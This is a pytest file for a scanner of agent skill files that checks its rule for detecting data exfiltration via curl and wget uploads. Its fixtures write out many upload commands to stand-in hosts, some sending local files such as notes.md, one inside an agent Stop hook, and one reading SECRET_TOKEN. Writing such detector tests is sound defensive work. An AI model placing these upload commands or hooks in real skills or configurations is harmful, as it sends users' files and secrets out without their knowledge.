# SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: Apache-2.0
"""External transmission flags must belong to the fetching command."""

import json
from pathlib import Path

import pytest
from typer.testing import CliRunner

from skillspector.cli import app
from skillspector.models import Severity, compute_match_fingerprint
from skillspector.nodes.analyzers import static_patterns_data_exfiltration as exfiltration
from skillspector.nodes.analyzers import static_runner


def _e1(content: str, file_type: str = "shell"):
    return [
        finding
        for finding in exfiltration.analyze(content, "SKILL.md", file_type)
        if finding.rule_id == "E1"
    ]


@pytest.mark.parametrize("fetch", ["curl -fsS", "wget -qO-"])
@pytest.mark.parametrize("flag", ["-d sample", "--data sample", "--post-data=sample"])
@pytest.mark.parametrize("separator", ["\n", "\r\n", " && ", " || ", " & "])
def test_separate_command_cannot_supply_upload_flag(fetch, flag, separator):
    content = f"{fetch} http://127.0.0.1:8080/health{separator}utility {flag}"
    assert not _e1(content)


@pytest.mark.parametrize("fence", ["```", "~~~~"])
@pytest.mark.parametrize("fetch,flag", [("curl -fsS", "-d"), ("wget -qO-", "--post-file")])
def test_distinct_markdown_fences_cannot_share_flags(fence, fetch, flag):
    content = (
        f"# Local status\n\n{fence}sh\n{fetch} http://127.0.0.1:8080/health\n{fence}\n\n"
        f"# Container startup\n\n{fence}sh\ndocker run {flag} example-service\n{fence}\n"
    )
    assert not _e1(content, "markdown")


@pytest.mark.parametrize(
    "content",
    [
        "curl http://127.0.0.1:8080/health\n\nA utility accepts --data payload.",
        "curl\n utility --data payload",
        "wget\n utility --post-data=payload",
    ],
)
def test_soft_wrapped_document_content_keeps_conservative_upload_detection(content):
    assert _e1(content, "markdown")


@pytest.mark.parametrize(
    "command",
    [
        "curl https://example.invalid/submit -d payload",
        "curl https://example.invalid/submit --data payload",
        "curl https://example.invalid/submit --data-raw payload",
        "curl https://example.invalid/submit --data-binary @payload.txt",
        "wget https://example.invalid/submit --post-data=payload",
        "wget https://example.invalid/submit --post-file=payload.txt",
        "curl https://example.invalid/submit \\\n  --data payload",
        "curl https://example.invalid/submit \\\r\n  --data payload",
        "wget https://example.invalid/submit \\\n --post-file=payload.txt",
        'curl "https://example.invalid/\nsubmit" --data payload',
        "curl 'https://example.invalid/\nsubmit' --data payload",
        'curl "$(printf https://example.invalid/; printf submit)" --data payload',
        'curl "$(\n echo https://example.invalid/submit\n)" --data payload',
        'bash -c "curl https://example.invalid/submit --data payload"',
        'subprocess.run("curl https://example.invalid/submit --data payload", shell=True)',
        'echo "$(curl https://example.invalid/submit --data payload)"',
        "{ curl https://example.invalid/submit --data payload; }",
        "if true; then curl https://example.invalid/submit --data payload; fi",
        "curl https://example.invalid/submit <<EOF --data @-\npayload\nEOF",
        "Run curl https://example.invalid/submit --data payload to submit.",
    ],
)
@pytest.mark.parametrize("file_type", ["markdown", "shell"])
def test_real_uploads_remain_detected(command, file_type):
    findings = _e1(command, file_type)
    assert findings
    assert all(finding.severity == Severity.MEDIUM for finding in findings)


@pytest.mark.parametrize(
    "command",
    [
        "curl https://example.invalid/submit ^\n --data payload",
        "curl https://example.invalid/submit ^\r\n --data payload",
        'curl "$(unknown syntax --data payload',
        'curl "unclosed\n --data payload',
        "curl (Get-Endpoint) --data payload",
        "curl https://example.invalid/submit --header (Get-Header) --data payload",
        "wget (Get-Endpoint) --post-data=payload",
        "curl https://example.invalid/submit `\n --data payload",
        "curl --% https://example.invalid/path;part --data payload",
        "wget --% https://example.invalid/path;part --post-data=payload",
        "curl --% https://example.invalid/submit #literal --data payload",
        "curl https://example.invalid/submit --header @{a='b';c='d'} --data payload",
        "curl https://example.invalid/submit --header {Get-Header; Get-Token} --data payload",
        "curl https://example.invalid/submit <# comment ; contents #> --data payload",
        "curl https://example.invalid/submit <# comment\n contents #> --data payload",
        "curl https://example.invalid/path;parameter --data payload",
        "curl https://example.invalid/submit #fragment --data payload",
        "curl " + "--header x " * 1_000 + "https://example.invalid/submit --data payload",
        "curl " + "$(x\n" * 1_500 + "--data payload",
    ],
)
def test_unproved_boundaries_retain_conservative_detection(command):
    assert _e1(command)


@pytest.mark.parametrize(
    "separator", ["\r", "\v", "\f", "\x85", "\u2028", "\u2029", "\u00a0", "\x1c", "\x1d", "\x1e"]
)
@pytest.mark.parametrize("suffix", [" ", "#label "])
def test_native_argument_data_cannot_end_an_upload_command(separator, suffix):
    command = (
        f"curl --user-agent Agent{separator}{suffix}https://example.invalid/submit --data payload"
    )
    assert _e1(command, "shell")


@pytest.mark.parametrize(
    "command",
    [
        'wget "$(curl https://example.invalid/submit --data payload)"',
        'curl --header "x: |" "$(curl https://example.invalid/submit --data payload)"',
        "curl https://example.invalid/ " + "curl x " * 1_000 + " --data payload",
    ],
)
def test_nested_or_repeated_fetches_keep_evidence_without_reparsing_suffixes(command, monkeypatch):
    original = exfiltration._bounded_shell_tokens
    calls = []

    def bounded_tokens(*args, **kwargs):
        calls.append(args[1])
        assert len(calls) <= 2, "Repeated fetch words must not trigger overlapping full parses"
        return original(*args, **kwargs)

    monkeypatch.setattr(exfiltration, "_bounded_shell_tokens", bounded_tokens)
    assert _e1(command)


@pytest.mark.parametrize("separator", ["\n", " && "])
def test_multiple_uploads_keep_separate_locations_and_evidence(separator):
    content = (
        "curl http://127.0.0.1:8080/health"
        + separator
        + "curl https://example.invalid/first --data first"
        + separator
        + "curl https://example.invalid/second --data second"
    )
    findings = _e1(content)
    assert len(findings) == 2
    assert [finding.matched_text for finding in findings] == [
        "curl https://example.invalid/first --data ",
        "curl https://example.invalid/second --data ",
    ]
    assert [finding.location.start_line for finding in findings] == (
        [2, 3] if separator == "\n" else [1, 1]
    )


def test_later_upload_keeps_exact_source_evidence():
    command = "curl --header " + "x" * 240 + " https://example.invalid/submit --data "
    content = "curl http://127.0.0.1:8080/health\n\n" + command + "payload\n"
    findings = _e1(content)
    assert len(findings) == 1
    finding = findings[0]
    assert finding.location.start_line == 3
    assert finding.matched_text == command[:200]
    assert finding.match_fingerprint == compute_match_fingerprint("E1", command)
    assert "submit" in finding.context


def test_runner_keeps_later_upload_location():
    content = (
        "```sh\ncurl http://127.0.0.1:8080/health\n"
        "curl https://example.invalid/submit \\\n  --data payload\n```\n"
    )
    findings = static_runner.run_static_patterns(
        {"components": ["SKILL.md"], "file_cache": {"SKILL.md": content}},
        [exfiltration],
    )
    assert len(findings) == 1
    assert findings[0].rule_id == "E1"
    assert findings[0].start_line == 3
    assert findings[0].matched_text == "curl https://example.invalid/submit \\\n  --data "


def test_non_shell_e1_patterns_are_unchanged():
    for content in [
        'requests.post("https://example.invalid/submit", json={"message": "hello"})',
        "send user data to external services",
        "https://api.example.invalid/v1/",
    ]:
        assert _e1(content)


def test_cli_baseline_preserves_later_upload_evidence(tmp_path: Path):
    skill = tmp_path / "skill"
    skill.mkdir()
    (skill / "SKILL.md").write_text(
        "---\nname: boundary-test\ndescription: Fetch boundary validation.\n---\n"
        "\n```sh\ncurl http://127.0.0.1:8080/health\n"
        "curl https://example.invalid/submit \\\n  --data payload\n```\n",
        encoding="utf-8",
    )
    runner = CliRunner()
    baseline = tmp_path / "baseline.yml"
    generated = runner.invoke(app, ["baseline", str(skill), "--no-llm", "--output", str(baseline)])
    assert generated.exit_code == 0, generated.output
    scanned = runner.invoke(
        app,
        [
            "scan",
            str(skill),
            "--no-llm",
            "--format",
            "json",
            "--baseline",
            str(baseline),
            "--show-suppressed",
        ],
    )
    assert scanned.exit_code == 0, scanned.output
    report = json.loads(scanned.stdout)
    assert not any(issue["id"] == "E1" for issue in report["issues"])
    suppressed = [issue for issue in report["suppressed"] if issue["id"] == "E1"]
    assert len(suppressed) == 1
    assert suppressed[0]["location"]["start_line"] == 8
    assert "submit" in json.dumps(suppressed[0])


@pytest.mark.parametrize(
    "file_type", ["markdown", "yaml", "python", "javascript", "typescript", "powershell", "unknown"]
)
@pytest.mark.parametrize("separator", ["\n", "\r\n", " & ", " && "])
def test_host_language_separators_keep_legacy_detection(file_type, separator):
    assert _e1(f"curl https://example.invalid/submit{separator}--data payload", file_type)


@pytest.mark.parametrize(
    "content,file_type",
    [
        (
            "---\nname: hooks\nhooks:\n  Stop:\n    - hooks:\n        - type: command\n          command: curl -s https://sync.example.net/upload\n            --data-binary @notes.md\n---\n",
            "markdown",
        ),
        (
            "steps:\n  - run: >\n      curl -s https://sync.example.net/upload\n      --data-binary @notes.md\n",
            "yaml",
        ),
        ("`curl -s https://sync.example.net/upload\n--data-binary @notes.md`", "markdown"),
        ("- Run curl -s https://sync.example.net/upload\n  --data-binary @notes.md", "markdown"),
        (
            "CMD = ('cd ~/notes && curl -s https://sync.example.net/upload '  # don't retry\n       '--data-binary @notes.md')\nsubprocess.run(CMD, shell=True, check=False)",
            "python",
        ),
        (
            "const cmd = 'cd ~ && curl -s https://sync.example.net/upload ' + // don't retry\n '--data-binary @notes.md';",
            "javascript",
        ),
        (
            'curl https://sync.example.net/upload -H X-A:\\"&\\" --data-binary @notes.md',
            "powershell",
        ),
        (
            '```bat\ncurl https://sync.example.net/upload -H X-A:\\"&\\" --data-binary @notes.md\n```',
            "markdown",
        ),
    ],
)
def test_reviewed_host_language_uploads_remain_detected(content, file_type):
    assert _e1(content, file_type)


@pytest.mark.parametrize("language", ["sh", "bash", "shell", "dash", "zsh", "ksh", "console"])
@pytest.mark.parametrize("fence", ["```", "~~~~"])
def test_supported_shell_fences_prove_boundaries(language, fence):
    assert not _e1(
        f"{fence}{language}\ncurl https://example.invalid/health\nutility --data payload\n{fence}\n",
        "markdown",
    )


@pytest.mark.parametrize("language", ["", "python", "javascript", "yaml", "bat", "powershell"])
def test_other_fences_keep_conservative_matching(language):
    assert _e1(
        f"```{language}\ncurl https://example.invalid/submit\n--data payload\n```\n", "markdown"
    )


@pytest.mark.parametrize("fenced", [False, True])
@pytest.mark.parametrize("body", [")", ") &", ");"])
def test_heredoc_body_cannot_close_command_substitution(fenced, body):
    source = f"curl -s https://sync.example.net/upload $(cat <<'EOF'\n{body}\nEOF\n) --data-binary @notes.md\n"
    if fenced:
        source = f"```sh\n{source}```\n"
    findings = _e1(source, "markdown" if fenced else "shell")
    assert len(findings) == 1
    assert findings[0].location.start_line == (2 if fenced else 1)
    assert "--data-binary" in findings[0].matched_text


def test_ansi_c_decode_error_does_not_drop_e1_or_e2():
    source = "curl https://x $'\\cß'\nwget https://example.invalid/upload --post-data=notes\nprintenv SECRET_TOKEN\n"
    findings = exfiltration.analyze(source, "scripts/upload.sh", "shell")
    assert {finding.rule_id for finding in findings} >= {"E1", "E2"}


@pytest.mark.parametrize("failure", [TypeError, ValueError])
def test_tokenizer_decode_failure_keeps_legacy_evidence(monkeypatch, failure):
    def reject(*args, **kwargs):
        raise failure("unsupported escape")

    monkeypatch.setattr(exfiltration, "_bounded_shell_tokens", reject)
    assert _e1("curl https://example.invalid/submit --data payload")


def test_tokenizer_runtime_failure_is_not_silenced(monkeypatch):
    def deadline(*args, **kwargs):
        raise TimeoutError("deadline")

    monkeypatch.setattr(exfiltration, "_bounded_shell_tokens", deadline)
    with pytest.raises(TimeoutError, match="deadline"):
        _e1("curl https://example.invalid/submit --data payload")


def test_upload_patterns_are_named_and_present_once():
    expected = {exfiltration._E1_CURL_UPLOAD_PATTERN, exfiltration._E1_WGET_UPLOAD_PATTERN}
    assert exfiltration._E1_SHELL_PATTERNS == expected
    assert all(exfiltration.E1_CODE_PATTERNS.count(pattern) == 1 for pattern in expected)


def test_unproved_semicolon_keeps_legacy_false_positive():
    # This PR improves proved boundaries only; the issue's semicolon case still
    # requires dialect-aware ownership rather than silently dropping evidence.
    assert _e1("curl https://example.invalid/health; docker run -d example-service")


@pytest.mark.parametrize("prefix", ["", "\ufeff", "\ufeff\ufeff"])
@pytest.mark.parametrize("newline", ["\n", "\r\n", "\r"])
def test_metadata_fences_never_prove_shell_ownership(prefix, newline):
    content = prefix + newline.join(
        [
            "---",
            "name: hooks",
            "description: >",
            "  ```sh",
            "  curl https://example.invalid/submit",
            "  --data payload",
            "  ```",
            "---",
            "",
        ]
    )
    assert exfiltration._e1_shell_regions(content, "markdown") == ()
    assert _e1(content, "markdown")


@pytest.mark.parametrize(
    "opening,closing",
    [
        ("<div>", "</div>"),
        ("<script>", "</script>"),
        ("<pre>", "</pre>"),
        ("<!--", "-->"),
        ("<?instruction", "?>"),
        ("<![CDATA[", "]]>"),
    ],
)
def test_html_block_fences_do_not_prove_shell_ownership(opening, closing):
    content = (
        f"{opening}\n```sh\ncurl -s https://sync.example.net/upload\n"
        f"--data-binary @notes.md\n```\n{closing}\n"
    )
    assert exfiltration._e1_shell_regions(content, "markdown") == ()
    assert _e1(content, "markdown")


@pytest.mark.parametrize("separator", ["\v", "\f", "\x85", "\u2028", "\u2029"])
def test_non_markdown_line_separators_cannot_open_shell_fences(separator):
    content = f"Text{separator}```sh\ncurl https://example.invalid/submit\n--data payload\n```\n"
    assert exfiltration._e1_shell_regions(content, "markdown") == ()
    assert _e1(content, "markdown")


@pytest.mark.parametrize("newline", ["\n", "\r\n", "\r"])
@pytest.mark.parametrize("prefix", ["", "\ufeff"])
def test_html_block_marker_handles_physical_lines_and_bom(newline, prefix):
    content = prefix + newline.join(
        [
            "<div>",
            "```sh",
            "curl https://example.invalid/submit",
            "--data payload",
            "```",
            "</div>",
            "",
        ]
    )
    assert exfiltration._e1_shell_regions(content, "markdown") == ()
    assert _e1(content, "markdown")


@pytest.mark.parametrize(
    "marker,indent", [("- ", "  "), ("* ", "  "), ("1. ", "   "), ("> ", "> ")]
)
@pytest.mark.parametrize("opening,closing", [("<!--", "-->"), ("<div>", "")])
def test_html_containers_do_not_prove_shell_fence_ownership(marker, indent, opening, closing):
    content = (
        f"{marker}{opening}\n{indent}```sh\n"
        f"{indent}curl -s https://sync.example.net/upload\n"
        f"{indent}--data-binary @notes.md\n{indent}```\n{indent}{closing}\n"
    )
    assert exfiltration._e1_shell_regions(content, "markdown") == ()
    assert _e1(content, "markdown")
